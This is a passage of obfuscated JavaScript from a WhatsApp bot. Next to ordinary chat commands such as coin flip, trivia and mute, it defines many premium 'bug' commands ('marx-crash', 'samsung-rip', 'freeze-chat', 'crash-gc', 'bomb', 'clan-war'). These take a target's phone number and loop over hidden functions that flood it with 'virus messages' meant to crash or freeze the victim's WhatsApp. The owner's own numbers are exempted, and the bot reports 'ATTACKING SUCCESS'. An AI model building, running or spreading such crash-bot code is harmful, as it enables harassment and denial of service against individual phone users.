ᴍᴀʀx-ᴄʀᴀsʜ\n┗━━━━━━━━━━━━━━━━━━━┛ ";
          const _0x1ca372 = {
            ..._0x224919
          };
          _0x1ca372.hasMediaAttachment = false;
          const _0x10fd3f = {
            text: _0x5870a2
          };
          const _0x39ca40 = {
            quoted: _0xea19ed
          };
          const _0x5a1a12 = _0x770315(_0x21f0d9.chat, {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  header: _0x1ca372,
                  body: _0x10fd3f,
                  footer: {
                    text: ""
                  },
                  nativeFlowMessage: {
                    buttons: [{
                      name: "cta_url",
                      buttonParamsJson: "{\ndisplay_text: '𝙈𝙖𝙧𝙭 𝘽𝙤𝙩 𝙄𝙣𝙘',\nurl: \"" + global.url + "\",\nmerchant_url: \"" + global.url + "\"\n}"
                    }],
                    messageParamsJson: ""
                  }
                }
              }
            }
          }, _0x39ca40);
          await _0x4b53e5.relayMessage(_0x21f0d9.chat, _0x5a1a12.message, {
            messageId: _0x5a1a12.key.id
          });
        }
        break;
      case "iosmenux":
        {
          await _0x34c772();
          const _0xd65f70 = {
            image: _0x34a350
          };
          const _0x4e4f3b = {
            upload: _0x4b53e5.waUploadToServer
          };
          let _0x3e6596 = await prepareWAMessageMedia(_0xd65f70, _0x4e4f3b);
          let _0x5d40a3 = "\n┏━━━━━━━━━━━━━━━━━━━┓\n┃𖥂 *" + _0x214fac + "* *\n┃             `" + _0x45dcac + "`\n┃━━━━━━━━━━━━━━━━━━━\n┃ 𖥂 `𝐓𝐈𝐌𝐄` : *" + _0x461573 + "*\n┃ 𖥂 `𝐃𝐀𝐓𝐄` : *" + _0x461a13 + "*\n┃ 𖥂 `𝐁𝐎𝐓` : " + global.namabot + "\n┃ 𖥂 `𝐕𝐄𝐑𝐒𝐈𝐎𝐍` : " + global.versisc + "\n┃ 𖥂 `𝐎𝐖𝐍𝐄𝐑` : " + global.namaown + "\n┗━━━━━━━━━━━━━━━━━━━┛\n┏━━━━━━━━━━━━━━━━━━━┓\n┃ " + global.simbol + " ɪᴏs-ʜᴀʀᴅ\n┃ " + global.simbol + " ɪᴏs-ʙᴏᴏᴍ\n┃ " + global.simbol + " ɪᴏs-ɴᴜʟʟ\n┃ " + global.simbol + " ɪᴏs-ᴄʀᴀsʜ\n┃ " + global.simbol + " ɪᴏs-ʙʟᴀsᴛ\n┃ " + global.simbol + " ɪᴏs-ʙᴇᴛᴀ\n┃ " + global.simbol + " ɪᴏs-ғᴀʟʟ\n┃ " + global.simbol + " ɪᴏs-ᴍᴀʀx\n┃ " + global.simbol + "  ɪᴏs-ʙʟᴀɴᴋ\n┗━━━━━━━━━━━━━━━━━━━┛";
          const _0x4700dd = {
            ..._0x3e6596
          };
          _0x4700dd.hasMediaAttachment = false;
          const _0x26db94 = {
            text: _0x5d40a3
          };
          const _0x3860fa = {
            quoted: _0xea19ed
          };
          const _0x17f2ce = _0x770315(_0x21f0d9.chat, {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  header: _0x4700dd,
                  body: _0x26db94,
                  footer: {
                    text: ""
                  },
                  nativeFlowMessage: {
                    buttons: [{
                      name: "cta_url",
                      buttonParamsJson: "{\ndisplay_text: '𝙈𝙖𝙧𝙭 𝘽𝙤𝙩 𝙄𝙣𝙘',\nurl: \"" + global.url + "\",\nmerchant_url: \"" + global.url + "\"\n}"
                    }],
                    messageParamsJson: ""
                  }
                }
              }
            }
          }, _0x3860fa);
          await _0x4b53e5.relayMessage(_0x21f0d9.chat, _0x17f2ce.message, {
            messageId: _0x17f2ce.key.id
          });
        }
        break;
      case "addprem":
        if (!_0x39695a) {
          return _0x3b9923(mess.OnlyOwner);
        }
        if (!_0x40d288) {
          return _0x3b9923("Use of " + (_0x3a5987 + _0x4ae68c) + " number\nExample " + (_0x3a5987 + _0x4ae68c) + " 234xxx");
        }
        var _0x200f51 = _0x40d288.split("|")[0].replace(/[^0-9]/g, "");
        _0x13b948.push(_0x200f51);
        _0x4d1a4f.writeFileSync("./database/premium.json", JSON.stringify(_0x13b948));
        _0x3b9923(_0x200f51 + " `𝔗𝔥𝔦𝔰 𝔘𝔰𝔢𝔯 𝔦𝔰 𝔫𝔬𝔴 𝔭𝔯𝔢𝔪𝔦𝔲𝔪`");
        await _0x96020a(3500);
        break;
      case "delprem":
        if (!_0x39695a) {
          return _0x3b9923(mess.OnlyOwner);
        }
        if (!_0x40d288) {
          return _0x3b9923("Use of " + (_0x3a5987 + _0x4ae68c) + " number\nExample " + (_0x3a5987 + _0x4ae68c) + " 234xxx");
        }
        prem2 = _0x40d288.split("|")[0].replace(/[^0-9]/g, "");
        unp = _0x13b948.indexOf(prem2);
        _0x13b948.splice(unp, 1);
        _0x4d1a4f.writeFileSync("./database/premium.json", JSON.stringify(_0x13b948));
        _0x3b9923(prem2 + " `𝔗𝔥𝔦𝔰 𝔘𝔰𝔢𝔯 𝔦𝔰 𝔫𝔬 𝔩𝔬𝔫𝔤𝔢𝔯 𝔭𝔯𝔢𝔪𝔦𝔲𝔪` ");
        break;
      case "inspect":
      case "ci":
        {
          if (!_0x2054ca) {
            return _0x3b9923(mess.premium);
          }
          if (!_0x40d288) {
            return _0x3b9923("Send commands " + (_0x3a5987 + _0x4ae68c) + " https://whatsapp.com/channel/xxxxxxxx");
          }
          if (!_0x13e106[0] && !_0x13e106[0].includes("whatsapp.com/channel")) {
            return _0x3b9923("invalid link");
          }
          await _0x4b53e5.sendMessage(_0x21f0d9.chat, {
            react: {
              text: "⏱️",
              key: _0x21f0d9.key
            }
          });
          function _0x5c6bd9(_0x2fdd43) {
            const _0x51e3cc = new Date(_0x2fdd43 * 1000);
            const _0x158ba0 = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
            const _0x227a20 = _0x51e3cc.getDate();
            const _0x1423a1 = _0x158ba0[_0x51e3cc.getMonth()];
            const _0x4c564b = _0x51e3cc.getFullYear();
            return _0x227a20 + " " + _0x1423a1 + " " + _0x4c564b;
          }
          try {
            let _0x458fcf = _0x13e106[0].split("https://whatsapp.com/channel/")[1];
            let _0xe03911 = await _0x4b53e5.newsletterMetadata("invite", _0x458fcf);
            let _0x59eb83 = "*NEWSLETTER ID*\n\n*Name:* " + _0xe03911.name + "\n*ID*: " + _0xe03911.id + "\n*Status*: " + _0xe03911.state + "\n*Dibuat Pada*: " + _0x5c6bd9(_0xe03911.creation_time) + "\n*Subscribers*: " + _0xe03911.subscribers + "\n*Meta Verify*: " + _0xe03911.verification + "\n*React Emoji:* " + _0xe03911.reaction_codes + "\n*Description*: " + readmore + "\n" + _0xe03911.description + "\n";
            const _0x412b5c = {
              text: _0x59eb83
            };
            let _0x2186cf = _0x770315(_0x21f0d9.chat, {
              viewOnceMessage: {
                message: {
                  messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                  },
                  interactiveMessage: _0xda26e2.Message.InteractiveMessage.create({
                    body: _0xda26e2.Message.InteractiveMessage.Body.create(_0x412b5c),
                    footer: _0xda26e2.Message.InteractiveMessage.Footer.create({
                      text: ""
                    }),
                    header: _0xda26e2.Message.InteractiveMessage.Header.create({
                      title: "",
                      subtitle: "",
                      hasMediaAttachment: false
                    }),
                    nativeFlowMessage: _0xda26e2.Message.InteractiveMessage.NativeFlowMessage.create({
                      buttons: [{
                        name: "cta_copy",
                        buttonParamsJson: " {\"display_text\":\"Copy ID\",\"id\":\"123456789\",\"copy_code\":\"" + _0xe03911.id + "\"}"
                      }]
                    })
                  })
                }
              }
            }, {
              quoted: _0x21f0d9
            });
            await _0x4b53e5.relayMessage(_0x2186cf.key.remoteJid, _0x2186cf.message, {
              messageId: _0x2186cf.key.id
            });
          } catch (_0x4205cd) {
            _0x3b9923("invalid link");
          }
        }
        break;
      case "marx-attack":
      case "marx-1jam":
      case "vaporize":
      case "obliterate":
      case "extinct":
      case "samsung-rip":
        {
          if (!_0x2054ca) {
            return _0x3b9923(mess.premium);
          }
          if (!_0x40d288) {
            return _0x3b9923("Example: ." + _0x4ae68c + " 234xxx");
          }
          let _0x361ef6 = q.replace(/[^0-9]/g, "");
          if (_0x361ef6.startsWith("0")) {
            return _0x3b9923("`[ # ]` Enter the Starting Number of the Country Code\n\n`[ # ]` Example : ." + _0x4ae68c + " 234xxx");
          }
          target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await _0x3b9923(mess.bugrespon);
          for (let _0xd997be = 0; _0xd997be < 5; _0xd997be++) {
            await _0x425a3c(target);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0x425a3c(target, _0x359358);
            await _0x4fbc32(target, _0x28a3bf);
            await _0x4fbc32(target, _0x28a3bf);
            await _0x4fbc32(target, _0x28a3bf);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0x96020a(500);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0x96020a(500);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0x96020a(500);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0x425a3c(target, _0x28a3bf);
          }
          await _0x3b9923(mess.donebug);
        }
        break;
      case "apks":
        {
          if (!_0x40d288) {
            return _0x3b9923("Contoh: " + (_0x3a5987 + _0x4ae68c) + " whatsapp");
          }
          _0x4b53e5.sendMessage(_0x21f0d9.chat, {
            react: {
              text: "🔎",
              key: _0x21f0d9.key
            }
          });
          var _0x3cd824 = await fetch("https://dikaardnt.com/api/search/apk?q=" + _0x4ce25b);
          var _0x20cdb0 = await _0x3cd824.json();
          var _0x2fcf81 = "\nResults searching: " + _0x40d288 + "\n\nTitle: " + _0x20cdb0[0].package + "\nDeveloper: " + _0x20cdb0[0].developer + "\nRating: " + _0x20cdb0[0].rating + "\nLink: " + _0x20cdb0[0].url + "\n";
          const _0x3ee0ee = {
            url: _0x20cdb0[0].thumbnail
          };
          const _0x2a5923 = {
            image: _0x3ee0ee,
            caption: _0x2fcf81
          };
          await _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x2a5923, {
            quoted: _0x21f0d9
          });
        }
        break;
      case "xchristmas":
      case "cripple-ui":
      case "xui":
      case "santa-chucky":
      case "christmas-crash":
      case "kill-samsung":
      case "flood":
      case "crash-ui":
      case "crash-andriod":
      case "hohoho":
        {
          if (!_0x2054ca) {
            return _0x3b9923(mess.premium);
          }
          if (!_0x40d288) {
            return _0x3b9923("\n𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕\n            \nUse country code 234,\n here's how to use it.\n*Example:* " + (_0x3a5987 + _0x4ae68c) + " 234");
          }
          let _0x293428 = _0x21f0d9.mentionedJid[0] ? _0x21f0d9.mentionedJid[0] : _0x21f0d9.quoted ? _0x21f0d9.quoted.sender : q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          const _0x4f8ec7 = ["2348108778025", "2348127185979", "2349063791511"];
          if (_0x4f8ec7.includes(_0x293428.replace("@s.whatsapp.net", ""))) {
            return _0x3b9923("Sorry, I can't harm my master!\nNumber: " + _0x293428.replace("@s.whatsapp.net", ""));
          }
          if (_0x293428.startsWith("0")) {
            return _0x3b9923("\n𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕\nDon't use 08! \nUse country code 234. *Example:* " + (_0x3a5987 + _0x4ae68c) + " 234");
          }
          await _0x96020a(1000);
          _0x3b9923("𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕\n        \nBot successfully sends a virus message to the target\nNumber : " + _0x293428 + " \nVirus/Bug : " + _0x4ae68c);
          await _0x3b9923(mess.bugrespon);
          for (let _0x3b57c0 = 0; _0x3b57c0 < 5; _0x3b57c0++) {
            await _0xb7d158(_0x293428);
          }
          console.log(_0x3e6b4d.blue.bold("Chucky Christmas crasher Activated: target will be done shortly!"));
          _0x3b9923("『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』\n\n*𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘 𝛁𝟕*\n\n𝐓𝐀𝐑𝐆𝐄𝐓 : " + _0x293428 + "\n𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆");
        }
        break;
      case "freeze-chat":
      case "chucky-suprise":
      case "hit-now":
      case "bug-now":
      case "blank-chat":
      case "bang-chat":
      case "slay-chat":
      case "off-chat":
      case "zeus-bug":
      case "fchat":
        {
          if (!_0x2054ca) {
            return _0x3b9923(mess.premium);
          }
          await _0x3b9923(mess.bugrespon);
          await _0x96020a(1000);
          _0x3b9923("𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕\n\n            Bot successfully sends a virus message to the target\nNumber : " + target + " \nVirus/Bug : " + _0x4ae68c);
          for (let _0x14724f = 0; _0x14724f < 5; _0x14724f++) {
            await _0xb7d158(_0x21f0d9.chat);
            await _0x3ade30(_0x21f0d9.chat);
          }
          console.log(_0x3e6b4d.white.bold("Chucky Christmas Crasher: the chat that will be sent can crash the target"));
        }
        break;
      case "bug-chat":
      case "frez-gc":
      case "chucky-gc":
      case "close-gc":
      case "kick-gc":
      case "crash-gc":
      case "fuck-gc":
      case "yahh":
      case "shutthefuckup":
      case "colmek_brp?":
      case "hiiii":
      case "permisi_paket":
      case "gua_bacok_lu":
      case "gua_sbnrnya_suka":
      case "yatim_anj":
      case "ampas":
      case "bokep_tayo":
      case "lu_dmn?":
      case "info_tobrut":
      case "lu_siapa?":
        {
          await _0x3b9923(mess.bugrespon);
          for (let _0x46ff12 = 0; _0x46ff12 < 40; _0x46ff12++) {
            const _0x1efcd0 = {
              Ptcp: true,
              chatId: _0x21f0d9.chat
            };
            await _0xe3a42f(_0x1efcd0);
            const _0x25199c = {
              Ptcp: true,
              chatId: _0x21f0d9.chat
            };
            await _0x2f7ba8(_0x25199c);
          }
          _0x3b9923("『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』\n\n     *𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘 𝛁𝟕*\n\n𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n");
        }
        break;
      case "reap":
      case "crash-sys":
      case "marx-crash":
        {
          if (!_0x2054ca) {
            return _0x3b9923(mess.premium);
          }
          if (!_0x40d288) {
            return _0x3b9923("Example: ." + _0x4ae68c + " 234xxx");
          }
          let _0x569263 = q.replace(/[^0-9]/g, "");
          if (_0x569263.startsWith("0")) {
            return _0x3b9923("`[ # ]` Enter the Starting Number of the Country Code\n\n`[ # ]` Example : ." + _0x4ae68c + " 234xxx");
          }
          target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await _0x3b9923(mess.bugrespon);
          for (let _0x5e1dcc = 0; _0x5e1dcc < 5; _0x5e1dcc++) {
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0x20638e(target, _0x359358);
            await _0x425a3c(target, _0x359358);
            await _0xaf37d6(target);
            await _0x4fbc32(target, _0x28a3bf);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
          }
          await _0x3b9923(mess.donebug);
        }
        break;
      case "mute":
        if (!_0x57a285) {
          return _0x3b9923("🎯 Hey, only admins can use this command! 😈", _0x21f0d9);
        }
        if (global.muted) {
          _0x3b9923("🔇 Mute is already **enabled**... Silence is golden, isn’t it? 🖤", _0x21f0d9);
        } else {
          global.muted = true;
          _0x3b9923("🔇 Mute has been **enabled**... 😈 Only I get to talk now! Be quiet! 🖤", _0x21f0d9);
        }
        break;
      case "unmute":
        if (!_0x57a285) {
          return _0x3b9923("🎯 Hey, only admins can use this command! 😈", _0x21f0d9);
        }
        if (!global.muted) {
          _0x3b9923("🔊 Mute is already **disabled**... You can talk now, just be careful. 👀", _0x21f0d9);
        } else {
          global.muted = false;
          _0x3b9923("🔊 Mute has been **disabled**... You can speak again, but don’t get too comfortable! 👀🖤", _0x21f0d9);
        }
        break;
      case "del":
        if (!_0x57a285) {
          return _0x3b9923("🎯 Only admins can delete messages... 😈", _0x21f0d9);
        }
        if (_0x21f0d9.isGroup) {
          _0x3b9923("💀 Deleting the message... Wait a moment! 🖤");
          _0x4b53e5.deleteMessage(_0x22a0dd, _0x21f0d9.key);
          _0x3b9923("🖤 *Message deleted*... No one will ever know! 😈", _0x21f0d9);
        } else {
          _0x3b9923("💀 Deleting your message... Wait a moment! 🖤");
          _0x4b53e5.deleteMessage(_0x22a0dd, _0x21f0d9.key);
          _0x3b9923("🖤 *Message deleted*... It’s gone forever! 😈", _0x21f0d9);
        }
        break;
      case "flip":
        const _0x14bb17 = ["Heads", "Tails"];
        const _0x53de44 = _0x14bb17[Math.floor(Math.random() * 2)];
        _0x3b9923("🪙 *Flipping the coin*... It's *" + _0x53de44 + "*! 🖤", _0x21f0d9);
        break;
      case "rps":
        const _0x505604 = ["rock", "paper", "scissors"];
        const _0x2d705c = _0x505604[Math.floor(Math.random() * 3)];
        const _0x15c7be = _0x13e106[0]?.toLowerCase();
        if (!_0x505604.includes(_0x15c7be)) {
          return _0x3b9923("🎯 Choose between *rock*, *paper*, or *scissors*! 😈", _0x21f0d9);
        }
        let _0x5935c4;
        if (_0x15c7be === _0x2d705c) {
          _0x5935c4 = "It’s a tie! 🤖";
        } else if (_0x15c7be === "rock" && _0x2d705c === "scissors" || _0x15c7be === "paper" && _0x2d705c === "rock" || _0x15c7be === "scissors" && _0x2d705c === "paper") {
          _0x5935c4 = "You win! 😈";
        } else {
          _0x5935c4 = "I win! Better luck next time... 🖤";
        }
        _0x3b9923("🤖 I chose: *" + _0x2d705c + "*.\n  🎯 You chose: *" + _0x15c7be + "*.\n  *Result*: " + _0x5935c4, _0x21f0d9);
        break;
      case "trivia":
        const _0x315dea = [{
          question: "What year was the first *Chucky* movie released?",
          options: ["1988", "1990", "1992"],
          answer: "1988"
        }, {
          question: "Who is known as the *father of gaming*?",
          options: ["Shigeru Miyamoto", "Hideo Kojima", "John Carmack"],
          answer: "Shigeru Miyamoto"
        }, {
          question: "Which anime features a ninja named Naruto Uzumaki?",
          options: ["Dragon Ball Z", "Naruto", "Bleach"],
          answer: "Naruto"
        }];
        let _0x1594be = _0x315dea[Math.floor(Math.random() * _0x315dea.length)];
        let _0x413b38 = _0x1594be.options.join(" | ");
        _0x3b9923("🎯 *Trivia Time*:\n  *Question*: " + _0x1594be.question + "\n  *Options*: " + _0x413b38 + "\n  🖤 *Type your answer* (e.g., *1988*, *Naruto*)", _0x21f0d9);
        global.triviaAnswer = _0x1594be.answer;
        break;
      case "answer":
        if (!global.triviaAnswer) {
          return _0x3b9923("🎯 There’s no active trivia right now! 😈", _0x21f0d9);
        }
        if (_0x13e106.join(" ").toLowerCase() === global.triviaAnswer.toLowerCase()) {
          _0x3b9923("🎉 Correct! You got it right! 😈", _0x21f0d9);
        } else {
          _0x3b9923("😞 Incorrect! Better luck next time... 🖤", _0x21f0d9);
        }
        global.triviaAnswer = null;
        break;
      case "ping":
        _0x3b9923("\n    𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕\n    \n> *" + moment.duration(Date.now() - parseInt(_0x21f0d9.messageTimestamp.toString()) * 1000).asSeconds() + " Seconds🗿*");
        break;
      case "ban":
        if (!_0x57a285) {
          return _0x3b9923("🎯 Only admins can ban... Don’t mess with me! 😈", _0x21f0d9);
        }
        _0x3b9923("🚨 *Banned*... You’re out of here, kid! 🖤", _0x21f0d9);
        break;
      case "help":
        _0x3b9923("👀 Here’s what I can do... \n  \n1. *mute* - Mute all members, only admins can talk! 🔇\n  \n2. *unmute* - Allow everyone to talk again! 🔊\n  \n3. *ban* - Banish someone forever... 😈\n  \n4. *kick* - Send someone packing! 👋\n  \n5. *info* - Get details about the bot! 🤖\n  \n6. *ping* - Check my response time! ⏱️\n  \n7. *quote* - Get a random Chucky quote! 🎬\n  \n8. *status* - Get the bot’s current status! 🛠️", _0x21f0d9);
        break;
      case "runtime":
        _0x3b9923("\n  𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕\n  \n> " + _0x26fa88(process.uptime()) + " 🗿");
        break;
      case "restart":
        if (!_0x39695a) {
          return _0x3b9923(mess.owner);
        }
        _0x3b9923("Restarting Bot.....");
        setTimeout(() => {
          process.send("reset");
        }, 3000);
        break;
      case "shutdown":
        {
          if (!_0x39695a) {
            return _0x3b9923(mess.owner);
          }
          _0x3b9923("Shutdown Bot...🤧😭");
          await _0x96020a(5000);
          process.eXit();
        }
        break;
      case "slayer":
      case "off":
      case "bomb":
      case "clan-bug":
      case "clan-war":
        {
          if (!_0x2054ca) {
            return _0x3b9923(mess.premium);
          }
          if (!_0x40d288) {
            return _0x3b9923("Example: ." + _0x4ae68c + " 234xxx");
          }
          let _0x53b08f = q.replace(/[^0-9]/g, "");
          if (_0x53b08f.startsWith("0")) {
            return _0x3b9923("`[ # ]` Enter the Starting Number of the Country Code\n\n`[ # ]` Example : ." + _0x4ae68c + " 234xxx");
          }
          target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await _0x3b9923(mess.bugrespon);
          for (let _0x18ed68 = 0; _0x18ed68 < 5; _0x18ed68++) {
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0x20638e(target, _0x359358);
            await _0x425a3c(target);
            await _0xaf37d6(target, _0x8d23b4);
            await _0x4fbc32(target, _0x28a3bf);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0x20638e(target, _0x28a3bf);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0x425a3c(target, _0x359358);
            await _0xaf37d6(target);
            await _0x21f01c(target, _0x359358);
            await _0x20638e(target, _0x359358);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x425a3c(target, _0x28a3bf);
            await _0x4fbc32(target, _0x28a3bf);
            await _0x4fbc32(target, _0x28a3bf);
            await _0x4fbc32(target, _0x28a3bf);
            await _0x4fbc32(target, _0x28a3bf);
            await _0x4fbc32(target, _0x28a3bf);
            await _0x4fbc32(target, _0x28a3bf);
            await _0x4fbc32(target, _0x28a3bf);
            await _0x4fbc32(target, _0x28a3bf);
            await _0x4fbc32(target, _0x28a3bf);
            await _0x4fbc32(target, _0x28a3bf);
            await _0x4fbc32(target, _0x28a3bf);
            await _0x4fbc32(target, _0x28a3bf);
            await _0x4fbc32(target, _0x28a3bf);
            await _0x4fbc32(target, _0x28a3bf);
            await _0x4fbc32(target, _0x28a3bf);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0x96020a(500);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0x96020a(500);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0x96020a(500);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0x20638e(target, _0x556ba8);
            await _0x21f01c(target, _0x359358);
            await _0xaf37d6(target);
            await _0x72fe09(target, _0x28a3bf);
            await _0x425a3c(target, _0x204a73);
            await _0x20638e(target, _0x359358);
            await _0x425a3c(target);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0x425a3c(target, _0x359358);
            await _0xaf37d6(target, _0x8d23b4);
            await _0x4fbc32(target, _0x28a3bf);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
